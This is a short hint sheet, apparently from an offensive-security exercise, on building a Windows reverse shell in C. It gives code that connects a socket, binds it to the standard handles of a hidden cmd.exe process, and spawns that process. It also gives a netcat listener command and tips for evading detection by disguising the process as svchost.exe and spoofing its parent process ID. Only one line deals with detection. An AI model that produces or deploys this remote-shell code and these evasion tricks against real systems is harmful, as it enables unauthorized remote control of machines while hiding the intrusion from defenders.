=== HINT 1: Create socket + connect ===
SOCKET s = socket(AF_INET, SOCK_STREAM, 0);
int conn = connect(s, (struct sockaddr*)&addr, sizeof(addr));

=== HINT 2: Configure STARTUPINFO ===
si.dwFlags     = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
si.wShowWindow = SW_HIDE;
si.hStdInput   = (HANDLE)s;
si.hStdOutput  = (HANDLE)s;
si.hStdError   = (HANDLE)s;

=== HINT 3: Spawn cmd.exe ===
// bInheritHandles=TRUE so child inherits socket handles
CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
WaitForSingleObject(pi.hProcess, INFINITE);

=== KEY INSIGHT ===
Listener: nc -lvnp 4444  (or ncat, pwncat, metasploit handler)
Bind shell: opposite - target listens, attacker connects.
Encrypted shell: use TLS socket or tunnel through HTTP (C2 beacon is a superset).
Detection: unusual parent process (powershell.exe, mshta.exe, wscript.exe spawning cmd.exe).
Evasion: name the process "svchost.exe" (copy to temp, spawn with spoofed PPID).
PPID spoofing: UpdateProcThreadAttribute with PROC_THREAD_ATTRIBUTE_PARENT_PROCESS.
